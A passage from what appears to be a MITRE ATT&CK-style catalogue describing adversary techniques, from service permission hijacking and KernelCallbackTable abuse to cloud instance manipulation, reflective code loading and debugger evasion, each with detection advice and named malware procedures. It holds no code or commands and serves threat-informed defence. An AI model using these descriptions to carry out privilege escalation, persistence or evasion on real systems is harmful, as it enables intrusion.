+- [S0363] Empire: Empire contains modules that can discover and exploit unquoted path vulnerabilities.
+
+### T1574.010 - Hijack Execution Flow: Services File Permissions Weakness
+
+Description:
+
+Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.
+
+Detection:
+
+Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data. Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.
+
+Procedures:
+
+- [S0089] BlackEnergy: One variant of BlackEnergy locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.
+
+### T1574.011 - Hijack Execution Flow: Services Registry Permissions Weakness
+
+Description:
+
+Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the FailureCommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted. The Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. If the Performance key is not already present and if an adversary-controlled user has the Create Subkey permission, adversaries may create the Performance key in the service’s Registry tree to point to a malicious DLL. Adversaries may also add the Parameters key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities. Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll.
+
+Detection:
+
+Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Monitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.
+
+Procedures:
+
+- [C0006] Operation Honeybee: During Operation Honeybee, the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the `svchost.exe` process.
+
+### T1574.012 - Hijack Execution Flow: COR_PROFILER
+
+Description:
+
+Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR. The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable. Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.
+
+Detection:
+
+For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and Reg, monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior. Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.
+
+Procedures:
+
+- [G0108] Blue Mockingbird: Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.
+- [S1066] DarkTortilla: DarkTortilla can detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active.
+
+### T1574.013 - Hijack Execution Flow: KernelCallbackTable
+
+Description:
+
+Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads. The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded. An adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process. A pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function). Once the pointer is located, the KernelCallbackTable can be duplicated, and a function in the table (e.g., fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered. The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload. Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.
+
+Detection:
+
+Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious behaviors that could relate to post-compromise behavior. Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances. for known bad sequence of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as WriteProcessMemory() and NtQueryInformationProcess() with the parameter set to ProcessBasicInformation may be used for this technique.
+
+Procedures:
+
+- [G0032] Lazarus Group: Lazarus Group has abused the KernelCallbackTable to hijack process control flow and execute shellcode.
+- [S0182] FinFisher: FinFisher has used the KernelCallbackTable to hijack the execution flow of a process by replacing the __fnDWORD function with the address of a created Asynchronous Procedure Call stub routine.
+
+### T1574.014 - Hijack Execution Flow: AppDomainManager
+
+Description:
+
+Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code. Known as "AppDomainManager injection," adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.
+
+Procedures:
+
+- [S1152] IMAPLoader: IMAPLoader is executed via the AppDomainManager injection technique.
+
+
+### T1578.001 - Modify Cloud Compute Infrastructure: Create Snapshot
+
+Description:
+
+An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence. An adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.
+
+Detection:
+
+The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account. In AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details.. In Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs. Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the gcloud compute instances create command to create a new VM disk from a snapshot. It is also possible to detect the usage of the GCP API with the "sourceSnapshot": parameter pointed to "global/snapshots/[BOOT_SNAPSHOT_NAME].
+
+Procedures:
+
+- [S1091] Pacu: Pacu can create snapshots of EBS volumes and RDS instances.
+
+### T1578.002 - Modify Cloud Compute Infrastructure: Create Cloud Instance
+
+Description:
+
+An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging. Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.
+
+Detection:
+
+The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity. In AWS, CloudTrail logs capture the creation of an instance in the RunInstances event, and in Azure the creation of a VM may be captured in Azure activity logs. Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances create to create a VM.
+
+Procedures:
+
+- [C0027] C0027: During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs.
+- [G1004] LAPSUS$: LAPSUS$ has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets.
+- [G1015] Scattered Spider: During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs. Scattered Spider has also created Amazon EC2 instances within the victim's environment.
+
+### T1578.003 - Modify Cloud Compute Infrastructure: Delete Cloud Instance
+
+Description:
+
+An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence. Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable. An adversary may also Create Cloud Instance and later terminate the instance after achieving their objectives.
+
+Detection:
+
+The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity. In AWS, CloudTrail logs capture the deletion of an instance in the TerminateInstances event, and in Azure the deletion of a VM may be captured in Azure activity logs. Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances delete to delete a VM.
+
+Procedures:
+
+- [G1004] LAPSUS$: LAPSUS$ has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process.
+
+### T1578.004 - Modify Cloud Compute Infrastructure: Revert Cloud Instance
+
+Description:
+
+An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs. Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.
+
+Detection:
+
+Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.
+
+### T1578.005 - Modify Cloud Compute Infrastructure: Modify Cloud Compute Configurations
+
+Description:
+
+Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim. For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional Resource Hijacking without raising suspicion by using up a victim’s entire quota. Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines. Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling Unused/Unsupported Cloud Regions.
+
+
+### T1599.001 - Network Boundary Bridging: Network Address Translation Traversal
+
+Description:
+
+Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks. Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device. A typical example of this is environments where internal networks make use of non-Internet routable addresses. When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design. In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device. In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders. Adversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities
+
+Detection:
+
+Consider monitoring network traffic on both interfaces of border network devices. Compare packets transmitted by the device between networks to look for signs of NAT being implemented. Packets which have their IP addresses changed should still have the same size and contents in the data encapsulated beyond Layer 3. In some cases, Port Address Translation (PAT) may also be used by an adversary. Monitor the border network device’s configuration to determine if any unintended NAT rules have been added without authorization.
+
+
+### T1600.001 - Weaken Encryption: Reduce Key Space
+
+Description:
+
+Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications. Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key. Adversaries may modify the key size used and other encryption parameters using specialized commands in a Network Device CLI introduced to the system through Modify System Image to change the configuration of the device.
+
+Detection:
+
+There is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image and Network Device CLI. Some detection methods require vendor support to aid in investigation.
+
+### T1600.002 - Weaken Encryption: Disable Crypto Hardware
+
+Description:
+
+Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data. Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of Modify System Image, forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., Reduce Key Space).
+
+Detection:
+
+There is no documented method for defenders to directly identify behaviors that disable cryptographic hardware. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image and Network Device CLI. Some detection methods require vendor support to aid in investigation.
+
+
+### T1601.001 - Modify System Image: Patch System Image
+
+Description:
+
+Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses. Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file. Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime. To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection. The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image. To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system. This method typically requires administrative level access to the device. In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system. Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory. This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime. By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging. Adding new capabilities for the adversary’s purpose include Keylogging, Multi-hop Proxy, and Port Knocking. Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders. When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system. By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot. When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots. However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.
+
+Detection:
+
+Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source. Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not. Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised. Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory. If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.
+
+Procedures:
+
+- [S0519] SYNful Knock: SYNful Knock is malware that is inserted into a network device by patching the operating system image.
+
+### T1601.002 - Modify System Image: Downgrade System Image
+
+Description:
+
+Adversaries may install an older version of the operating system of a network device to weaken security. Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. On embedded devices, downgrading the version typically only requires replacing the operating system file in storage. With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart. The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts. Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption. Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image.
+
+Detection:
+
+Many embedded network devices provide a command to print the version of the currently running operating system. Use this command to query the operating system for its version number and compare it to what is expected for the device in question. Because image downgrade may be used in conjunction with Patch System Image, it may be appropriate to also verify the integrity of the vendor provided operating system image file.
+
+
+### T1610 - Deploy Container
+
+Description:
+
+Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node. Containers can be deployed by various means, such as via Docker's create and start APIs or via a web application such as the Kubernetes dashboard or Kubeflow. In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes. Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.
+
+Detection:
+
+Monitor for suspicious or unknown container images and pods in your environment. Deploy logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application pods to detect malicious activity at the cluster level. In Docker, the daemon log provides insight into remote API calls, including those that deploy containers. Logs for management services or applications used to deploy containers other than the native technologies themselves should also be monitored.
+
+Procedures:
+
+- [S0599] Kinsing: Kinsing was run through a deployed Ubuntu container.
+- [G0139] TeamTNT: TeamTNT has deployed different types of containers into victim environments to facilitate execution. TeamTNT has also transferred cryptocurrency mining software to Kubernetes clusters discovered within local IP address ranges.
+- [S0683] Peirates: Peirates can deploy a pod that mounts its node’s root file system, then execute a command to create a reverse shell on the node.
+- [S0600] Doki: Doki was run through a deployed container.
+
+
+### T1612 - Build Image on Host
+
+Description:
+
+Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote build request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it. An adversary may take advantage of that build API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize Deploy Container using that custom image. If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment.
+
+Detection:
+
+Monitor for unexpected Docker image build requests to the Docker daemon on hosts in the environment. Additionally monitor for subsequent network communication with anomalous IPs that have never been seen before in the environment that indicate the download of malicious code.
+
+
+### T1620 - Reflective Code Loading
+
+Description:
+
+Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., Shared Modules). Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode). For example, the `Assembly.Load()` method executed by PowerShell may be abused to load raw code into the running process. Reflective code injection is very similar to Process Injection except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.
+
+Detection:
+
+Monitor for code artifacts associated with reflectively loading code, such as the abuse of .NET functions such as Assembly.Load() and Native API functions such as CreateThread(), memfd_create(), execve(), and/or execveat(). Monitor for artifacts of abnormal process execution. For example, a common signature related to reflective code loading on Windows is mechanisms related to the .NET Common Language Runtime (CLR) -- such as mscor.dll, mscoree.dll, and clr.dll -- loading into abnormal processes (such as notepad.exe). Similarly, AMSI / ETW traces can be used to identify signs of arbitrary code execution from within the memory of potentially compromised processes. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+
+Procedures:
+
+- [S1081] BADHATCH: BADHATCH can copy a large byte array of 64-bit shellcode into process memory and execute it with a call to `CreateThread`.
+- [S0689] WhisperGate: WhisperGate's downloader can reverse its third stage file bytes and reflectively load the file as a .NET assembly.
+- [S0022] Uroburos: Uroburos has the ability to load new modules directly into memory using its `Load Modules Mem` command.
+- [S0692] SILENTTRINITY: SILENTTRINITY can run a .NET executable within the memory of a sacrificial process by loading the CLR.
+- [S0194] PowerSploit: PowerSploit reflectively loads a Windows PE file into a process.
+- [S0447] Lokibot: Lokibot has reflectively loaded the decoded DLL into memory.
+- [S0666] Gelsemium: Gelsemium can use custom shellcode to map embedded DLLs into memory.
+- [S1059] metaMain: metaMain has reflectively loaded a DLL to read, decrypt, and load an orchestrator file.
+- [G0032] Lazarus Group: Lazarus Group has changed memory protection permissions then overwritten in memory DLL function code with shellcode, which was later executed via KernelCallbackTable hijacking. Lazarus Group has also used shellcode within macros to decrypt and manually map DLLs into memory at runtime.
+- [G0094] Kimsuky: Kimsuky has used the Invoke-Mimikatz PowerShell script to reflectively load a Mimikatz credential stealing DLL into memory.
+- [S0625] Cuba: Cuba loaded the payload into memory using PowerShell.
+- [S0154] Cobalt Strike: Cobalt Strike's execute-assembly command can run a .NET executable within the memory of a sacrificial process by loading the CLR.
+- [S1063] Brute Ratel C4: Brute Ratel C4 has used reflective loading to execute malicious DLLs.
+- [S1022] IceApple: IceApple can use reflective code loading to load .NET assemblies into `MSExchangeOWAAppPool` on targeted Exchange servers.
+- [S1145] Pikabot: Pikabot reflectively loads stored, previously encrypted components of the PE file into memory of the currently executing process to avoid writing content to disk on the executing machine.
+- [S0695] Donut: Donut can generate code modules that enable in-memory execution of VBScript, JScript, EXE, DLL, and dotNET payloads.
+- [S0367] Emotet: Emotet has reflectively loaded payloads into memory.
+- [S1213] Lumma Stealer: Lumma Stealer has used reflective loading techniques to load content into memory during execution.
+- [S1085] Sardonic: Sardonic has a plugin system that can load specially made DLLs into memory and execute their functions.
+- [S0595] ThiefQuest: ThiefQuest uses various API functions such as NSCreateObjectFileImageFromMemory to load and link in-memory payloads.
+- [S0661] FoggyWeb: FoggyWeb's loader has reflectively loaded .NET-based assembly/payloads into memory.
+- [S1143] LunarLoader: LunarLoader can use reflective loading to decrypt and run malicious executables in a new thread.
+
+
+### T1622 - Debugger Evasion
+
+Description:
+
+Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads. Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads. Specific checks will vary based on the target and/or adversary. On Windows, this may involve Native API function calls such as IsDebuggerPresent() and NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools. Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error). Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue. Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as OutputDebugStringW().
+
+Detection:
+
+Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious Native API function calls as well as processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. Monitor debugger logs for signs of abnormal and potentially malicious activity.
+
+Procedures:
+
+- [S1213] Lumma Stealer: Lumma Stealer has checked for debugger strings by invoking `GetForegroundWindow` and looks for strings containing “x32dbg”, “x64dbg”, “windbg”, “ollydbg”, “dnspy”, “immunity debugger”, “hyperdbg”, “debug”, “debugger”, “cheat engine”, “cheatengine” and “ida”.
+- [S1087] AsyncRAT: AsyncRAT can use the `CheckRemoteDebuggerPresent` function to detect the presence of a debugger.
+- [S1200] StealBit: StealBit can detect it is being run in the context of a debugger.
+- [S1183] StrelaStealer: StrelaStealer variants include functionality to identify and evade debuggers.
+- [S1111] DarkGate: DarkGate checks the BeingDebugged flag in the PEB structure during execution to identify if the malware is being debugged.
+- [S1145] Pikabot: Pikabot features several methods to evade debugging by analysts, including checks for active debuggers, the use of breakpoints during execution, and checking various system information items such as system memory and the number of processors.
+- [S0240] ROKRAT: ROKRAT can check for debugging tools.
+- [S0694] DRATzarus: DRATzarus can use `IsDebuggerPresent` to detect whether a debugger is present on a victim.
+- [S1070] Black Basta: The Black Basta dropper can check system flags, CPU registers, CPU instructions, process timing, system libraries, and APIs to determine if a debugger is present.
+- [S1018] Saint Bot: Saint Bot has used `is_debugger_present` as part of its environmental checks.
+- [S1207] XLoader: XLoader uses anti-debugging mechanisms such as calling `NtQueryInformationProcess` with `InfoClass=7`, referencing `ProcessDebugPort`, to determine if it is being analyzed.
+- [S1130] Raspberry Robin: Raspberry Robin leverages anti-debugging mechanisms through the use of ThreadHideFromDebugger.
+- [S1202] LockBit 3.0: LockBit 3.0 can check heap memory parameters for indications of a debugger and stop the flow of events to the attached debugger in order to hinder dynamic analysis.
+- [C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group used tools that used the `IsDebuggerPresent` call to detect debuggers.
+- [S1066] DarkTortilla: DarkTortilla can detect debuggers by using functions such as `DebuggerIsAttached` and `DebuggerIsLogging`. DarkTortilla can also detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active.
+- [S1060] Mafalda: Mafalda can search for debugging tools on a compromised host.
+- [S0595] ThiefQuest: ThiefQuest uses a function named is_debugging to perform anti-debugging logic. The function invokes sysctl checking the returned value of P_TRACED. ThiefQuest also calls ptrace with the PTRACE_DENY_ATTACH flag to prevent debugging.
+- [S1160] Latrodectus: Latrodectus has the ability to check for the presence of debuggers.
+- [S1039] Bumblebee: Bumblebee can search for tools used in static analysis.
+
+
+### T1647 - Plist File Modification
+
+Description:
+
